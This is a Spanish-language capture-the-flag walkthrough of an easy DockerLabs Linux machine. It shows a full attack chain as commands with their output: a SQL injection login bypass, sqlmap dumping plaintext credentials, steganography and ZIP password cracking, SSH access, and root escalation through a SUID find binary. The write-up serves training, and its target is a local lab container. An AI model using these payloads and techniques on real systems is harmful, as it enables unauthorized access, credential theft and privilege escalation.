Propiedades:
- OS: Linux
- Plataforma: DockerLabs
- Nivel: Easy
- Tags: #sqli #sqlmap #steganography #password-cracking #suid-abuse

![](assets/Pasted%20image%2020251109234535.png)

## Reconocimiento

Comienzo tirando un ping para comprobar la conectividad.

```bash
> ping -c 1 172.17.0.2
PING 172.17.0.2 (172.17.0.2) 56(84) bytes of data.
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=1.43 ms

--- 172.17.0.2 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 1.426/1.426/1.426/0.000 ms
```

- El TTL de 64 indica que estamos ante una máquina Linux.

Ahora tiro un escaneo con nmap para ver que puertos tenemos abiertos.

```bash
> nmap -p- --open --min-rate 5000 -Pn -n 172.17.0.2
----------------------------------------------------
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: DA:B4:F0:8E:E7:3E (Unknown)
```

- Puertos 22 y 80 abiertos.

Sobre los puertos abiertos realizo un segundo escaneo más profundo para detectar servicios, versiones y correr un conjunto de scripts de reconocimiento.

```bash
> nmap -p 22,80 -sS -Pn -n --min-rate 5000 -sCV 172.17.0.2 -oN target.txt
-------------------------------------------------------------------------
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
| ssh-hostkey: 
|   256 2c:ea:4a:d7:b4:c3:d4:e2:65:29:6c:12:c4:58:c9:49 (ECDSA)
|_  256 a7:a4:a4:2e:3b:c6:0a:e4:ec:bd:46:84:68:02:5d:30 (ED25519)
80/tcp open  http    Apache httpd 2.4.61 ((Debian))
|_http-title: Login Page
|_http-server-header: Apache/2.4.61 (Debian)
MAC Address: DA:B4:F0:8E:E7:3E (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

- Puerto 22 SSH OpenSSH 9.2p1 Debian 2+deb12u3
- Puerto 80 HTTP Apache httpd 2.4.61 (Debian)

## Enumeración

### Puerto 80 HTTP

La página principal muestra un formulario de login simple.

![](assets/Pasted%20image%2020251109194933.png)


**Fuzzing de Directorios.**

Utilizo `gobuster` para descubrir posibles recursos en el servidor web.

```bash
> gobuster dir -w raft-large-directories.txt -u http://172.17.0.2/ -x html,php,py,js,txt
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/page.php             (Status: 200) [Size: 2169]
/index.php            (Status: 200) [Size: 2351]
/auth.php             (Status: 200) [Size: 1852]
/server-status        (Status: 403) [Size: 275]
/index.php            (Status: 200) [Size: 2351]
```

- `index.php`: Formulario de login
- `auth.php`: Script que procesa la autenticación
- `page.php`: Página posterior al login

Accedo a `page.php` directamente y encuentro una funcionalidad para consultar la temperatura.

![](assets/Pasted%20image%2020251109195426.png)

## Explotación

### SQL Injection

El formulario de login `index.php` es vulnerable a **SQL Injection**. Puedo bypassear la autenticación con un payload simple.

```sql
1' or 1=1-- -
```

Al bypassear el login, soy redirigido a `page.php`.

### Explotación con SQLMap

Confirmo la vulnerabilidad utilizando `sqlmap`.

```bash
> sqlmap -u "http://172.17.0.2/index.php" --forms --batch
-----------------------------------------------------------
Parameter: username (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)
    Payload: username=NVJA' OR NOT 8202=8202#&password=ouXU

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: username=NVJA' AND (SELECT 8527 FROM(SELECT COUNT(*),CONCAT(0x7176767a71,(SELECT (ELT(8527=8527,1))),0x7178707671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- Pvzg&password=ouXU

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=NVJA' AND (SELECT 5085 FROM (SELECT(SLEEP(5)))loap)-- USWr&password=ouXU
```

- La aplicación es vulnerable a SQLi error-based.

Listo las bases de datos disponibles.

```bash
> sqlmap -u "http://172.17.0.2/index.php" --forms --dbs --batch
-----------------------------------------------------------------
[*] information_schema
[*] users
```

- La base de datos `users` es de interés.

Listo las tablas de la base de datos `users`.

```bash
> sqlmap -u "http://172.17.0.2/index.php" --forms -D users --tables --batch
----------------------------------------------------------------------------
Database: users
[1 table]
+----------+
| usuarios |
+----------+
```

Dumpeo el contenido de la tabla `usuarios`.

```bash
> sqlmap -u "http://172.17.0.2/index.php" --forms -D users -T usuarios --dump --batch
Table: usuarios
[4 entries]
+----+------------------------+------------+
| id | password               | username   |
+----+------------------------+------------+
| 1  | chocolateadministrador | admin      |
| 2  | lucas                  | lucas      |
| 3  | soyagustin123          | agustin    |
| 4  | directoriotravieso     | directorio |
+----+------------------------+------------+
```

### Descubrimiento de Directorio Oculto

Uno de los passwords encontrados es `directoriotravieso`, lo cual sugiere que podría ser un directorio. Accedo a `http://172.17.0.2/directoriotravieso/`.

![](assets/Pasted%20image%2020251109202221.png)

- Encuentro una imagen llamada `miramebien.jpg`

### Esteganografía

Descargo la imagen y analizo sus metadatos con `exiftool`, pero no encuentro nada relevante. Decido probar **esteganografía**.

Intento extraer datos ocultos con `steghide` usando las contraseñas encontradas, pero sin éxito. Decido crackear la contraseña con `stegseek`.

```bash
> stegseek miramebien.jpg /usr/share/wordlists/rockyou.txt
-------------------------------------------------------------
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Found passphrase: "chocolate"
[i] Original filename: "ocultito.zip".
[i] Extracting to "miramebien.jpg.out".
```

- Contraseña encontrada: `chocolate`
- Archivo extraído: `ocultito.zip`

Listo el contenido del archivo ZIP.

```bash
> unzip -l ocultito.zip
Archive:  ocultito.zip
16  2024-08-10 13:43   secret.txt
```

Intento extraer el ZIP pero requiere contraseña. Utilizo `fcrackzip` para crackearla.

```bash
> fcrackzip -u ocultito.zip -D -p /usr/share/wordlists/rockyou.txt
PASSWORD FOUND!!!!: pw == stupid1
```

Extraigo el contenido del ZIP y leo `secret.txt`.

```bash
> cat secret.txt
carlos:carlitos
```

- Credenciales SSH: `carlos:carlitos`

### Acceso SSH

Me conecto por SSH con las credenciales encontradas.

```bash
> ssh carlos@172.17.0.2
carlos@172.17.0.2's password: carlitos
Welcome to Debian GNU/Linux 12 (bookworm)

carlos@9533d1fb3eb7:~$ whoami
carlos
carlos@9533d1fb3eb7:~$ id                                                                                                                                        
uid=1000(carlos) gid=1000(carlos) groups=1000(carlos),100(users)
```

## Escalada de Privilegios

Dentro del sistema enumero binarios que pueda ejecutar con privilegios elevados.

```bash
> sudo -l
[sudo] password for carlos:
```

- No tengo permisos sudo sin contraseña.

### Búsqueda de Binarios SUID

Busco binarios con el bit SUID activado.

```bash
> carlos@9533d1fb3eb7:~$ find / -perm -4000 2>/dev/null 
-------------------------------------------------------
/usr/bin/find
```

- El binario `find` tiene SUID y pertenece a root.

Consulto [GTFOBins](https://gtfobins.github.io/gtfobins/find/) para encontrar formas de abusar de `find` con SUID.

```bash
> carlos@9533d1fb3eb7:~$ /usr/bin/find . -exec /bin/sh -p \; -quit              
# whoami
root
# id
uid=1000(carlos) gid=1000(carlos) euid=0(root) groups=1000(carlos),100(users)
```

El output muestra:
- `uid=1000(carlos)`: Identidad real del usuario
- `euid=0(root)`: Privilegios efectivos de root

***PWNED***
